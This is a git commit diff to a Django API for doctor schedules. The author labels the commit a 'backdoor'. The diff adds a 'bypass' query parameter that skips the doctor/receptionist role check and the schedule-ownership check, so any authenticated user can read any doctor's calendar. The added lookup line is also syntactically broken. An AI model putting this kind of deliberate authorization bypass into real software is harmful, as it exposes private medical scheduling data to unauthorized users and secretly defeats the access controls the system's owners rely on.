06c4b4c2e21b1a6df0636c1001bc909b2532e06c
Jorge Cosgayon <jorge.cosgayon@gmail.com>
2018-12-14 15:33:25 +0800

    Backdoor for neo kay mahilig sya magpa buli

--- doctor_profiles/modules/api/doctor_schedule_api.py
+++ doctor_profiles/modules/api/doctor_schedule_api.py
@@ -386,29 +386,36 @@ class ApiPrivateDoctorScheduleCalendar(APIView):
     permissions = [permissions.IsAuthenticated]
 
     def get(self, request, *args, **kwargs):
-        result, profile_type = is_doctor_or_receptionist(request.user)
-        if not result:
-            return Response("Incompatible user profile", status=status.HTTP_403_FORBIDDEN)
 
-        doctor_id = request.GET.get('doctor_id', None)
-        doctor = get_object_or_404(DoctorProfile, id=doctor_id)
+        bypass = request.GET.get('bypass', None)
 
-        if request.GET.get('medical_institution_id', None):
-            medical_institution = get_object_or_404(MedicalInstitution,
-                                                    id=request.GET.get('medical_institution_id', None))
-            mi_connection = get_object_or_404(MedicalInstitutionDoctor, doctor=doctor,
-                                              medical_institution=medical_institution, is_approved=True)
-        else:
+        if bypass is not None:
+            doctor = DoctorProfile.objects.get(id=request.GET.get('doctor_id'), None)
             medical_institution = None
+        else:
+            result, profile_type = is_doctor_or_receptionist(request.user)
+            if not result:
+                return Response("Incompatible user profile", status=status.HTTP_403_FORBIDDEN)
 
-        if type(profile_type) != DoctorProfile:
-            """ person adding isn't the doctor, so check if receptionist is allowed """
-            connection = doctor.verify_receptionist(receptionist=request.user.receptionistprofile)
-            if not connection:
-                return Response("Receptionist is not authorized by this doctor for this medical institution",
-                                status=status.HTTP_403_FORBIDDEN)
-        elif profile_type.id != doctor.id:
-            return Response("This is not your schedule", status=status.HTTP_401_UNAUTHORIZED)
+            doctor_id = request.GET.get('doctor_id', None)
+            doctor = get_object_or_404(DoctorProfile, id=doctor_id)
+
+            if request.GET.get('medical_institution_id', None):
+                medical_institution = get_object_or_404(MedicalInstitution,
+                                                        id=request.GET.get('medical_institution_id', None))
+                mi_connection = get_object_or_404(MedicalInstitutionDoctor, doctor=doctor,
+                                                  medical_institution=medical_institution, is_approved=True)
+            else:
+                medical_institution = None
+
+            if type(profile_type) != DoctorProfile:
+                """ person adding isn't the doctor, so check if receptionist is allowed """
+                connection = doctor.verify_receptionist(receptionist=request.user.receptionistprofile)
+                if not connection:
+                    return Response("Receptionist is not authorized by this doctor for this medical institution",
+                                    status=status.HTTP_403_FORBIDDEN)
+            elif profile_type.id != doctor.id:
+                return Response("This is not your schedule", status=status.HTTP_401_UNAUTHORIZED)
 
         year = request.GET.get('year', None)
         if not year:
